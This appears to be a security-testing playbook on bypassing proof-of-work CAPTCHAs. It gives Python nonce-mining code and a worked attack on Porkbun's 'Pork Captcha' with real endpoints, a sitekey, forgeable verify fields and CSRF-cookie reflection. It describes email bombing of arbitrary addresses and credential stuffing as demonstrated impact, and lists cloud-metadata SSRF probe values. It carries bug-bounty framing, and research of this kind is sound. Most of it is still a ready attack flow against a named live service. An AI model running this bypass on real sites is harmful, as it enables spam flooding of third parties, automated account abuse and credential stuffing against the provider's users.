# Proof-of-Work CAPTCHA Bypass

## When this applies
A target's "CAPTCHA" that is really a client-side **proof-of-work** (the browser
mines a SHA-256 nonce) instead of an interactive/image challenge. This is a bot
deterrent that costs the *attacker* CPU, not a real human test — so a script can
solve it in milliseconds. Tell-tale signs in the frontend JS or inline config:

- An issue endpoint returning `{"challenge":"<uuid>","challengeToken":"<jwt>","difficulty":N}`.
- A verify endpoint that consumes a mined `nonce` + `challengeToken`.
- Difficulty passed from the client: `minDifficulty` / `maxDifficulty` / `difficulty`.

## Technique (generic)
1. Pull the captcha JS (e.g. `/js/*captcha*.js`) or the inline `*.render(...)` config.
2. Read the difficulty in **bits** (e.g. `minDifficulty: 12`). An N-bit PoW means
   find a nonce such that `sha256(challenge + nonce)` has N leading zero bits —
   expected ~2^N hashes. `12 bits ≈ 4096 hashes ≈ a few ms` in Python. Anything
   under ~20 bits is effectively free to a bot.
3. Call the issue endpoint → `{challenge, challengeToken, difficulty}`.
4. Mine in Python (hashlib, way faster than the JS reference impl):
   ```python
   pref = "0" * (bits // 4); extra = 0 if bits % 4 == 0 else (1 << (4 - bits % 4))
   nonce = 0
   while True:
       h = hashlib.sha256((challenge + str(nonce)).encode()).hexdigest()
       if h.startswith(pref) and (extra == 0 or int(h[bits//4], 16) < extra):
           break
       nonce += 1
   ```
5. POST the verify endpoint with `{challengeToken, nonce, action, fingerprint,
   botHints:[forgeable], elapsed, ...}` → receive the `token`.
6. Use that token on the gated form POST. Because the PoW token is the *only*
   anti-bot gate, the whole flow can be done headless over HTTP.

## Worked example — Porkbun "Pork Captcha V1.3.1"
- Issue:  `POST /tools/porkCaptchaIssue {"sitekey":"805d2807-7ec4-44f5-84c0-f5cb5187d587"}`
  → `{"challenge":"<uuid>","challengeToken":"<jwt>","difficulty":12}`.
- Verify: `POST /tools/porkCaptchaChallenge {challengeToken, nonce:"<N>", fingerprint, sitekey, difficulty, elapsed, action, interactionEntropy, botHints, clickTimestamp, clickX, clickY, clickDelay}` → `{"token":"<jwt>"}`.
- Observed solves: nonce 132–5879, 6–23 ms. `maxDifficulty: 14`, `action:"accountCreate"` (login uses same sitekey with `action:"accountLogin"`).
- The token fills a hidden `<input name="porkcaptcha-token_...">`; the gated form POST
  also carries the CodeIgniter double-submit CSRF — the global `ajaxSetup` appends
  `csrf_pb=<cookie>&isajax=true` to every non-GET. Read the `csrf_pb` cookie, reflect
  it, done (no real CSRF barrier to a script).
- Downstream impact demonstrated: `POST /api/user/accountCreateCheck` with an
  arbitrary `email` + valid PoW token → `{"code":"CODESENT"}` → **email bombing** of
  any address from Porkbun's own mail; same PoW gates login → credential-stuffing.

## Pitfalls
- The *effective* anti-fraud gate may lie downstream of the captcha. Porkbun now
  requires **mandatory government-ID verification** for new accounts, so a PoW bypass
  alone does not yield a usable account — don't over-claim ATO from a captcha bypass.
- A real CAPTCHA (Cloudflare Turnstile) is often present only as a *fallback* "force
  captcha" modal after suspicious signals — the PoW is the primary gate.
- Do **not** claim SSRF from unvalidated inputs (e.g. `updateNs` accepting
  `127.0.0.1`/`169.254.169.254`) unless you prove the server-side DNS fetch — that
  needs a production account + an OAST/collab callback, not a sandbox.